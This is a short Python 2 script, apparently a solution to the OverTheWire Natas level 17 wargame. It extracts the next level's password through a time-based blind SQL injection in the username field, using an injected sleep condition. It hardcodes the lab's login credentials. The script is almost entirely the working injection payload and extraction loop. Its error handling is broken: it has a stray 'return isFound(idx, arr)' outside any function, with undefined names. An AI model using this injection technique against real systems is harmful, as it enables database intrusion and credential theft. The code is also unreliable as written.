###########################################################
#
# Linear Key Search with Timing Attack
#
###########################################################

import urllib
import urllib2
import socket

alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
natas18_pass = ""
i = 0

# create a password manager
def setupAuth():
	password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
	top_level_url = "http://natas17.natas.labs.overthewire.org/"
	password_mgr.add_password(None, top_level_url, "natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
	handler = urllib2.HTTPBasicAuthHandler(password_mgr)
	opener = urllib2.build_opener(handler)
	urllib2.install_opener(opener)

setupAuth()

a_len = len(alphabet)
while i < a_len:
	data = urllib.urlencode({"username":"natas18\" and if(password LIKE BINARY \"" + natas18_pass + alphabet[i] + "%\", sleep(2), 1) #"})
	# print "Trying: " + data
	try:
	 	u = urllib2.urlopen("http://natas17.natas.labs.overthewire.org/index.php", data, 1)
	except urllib2.URLError as urlerr:
		setupAuth()
		return isFound(idx, arr)
	except socket.timeout as sto:
		natas18_pass += alphabet[i];
		print("Password: " + natas18_pass)
		i = 0
		continue

	i += 1
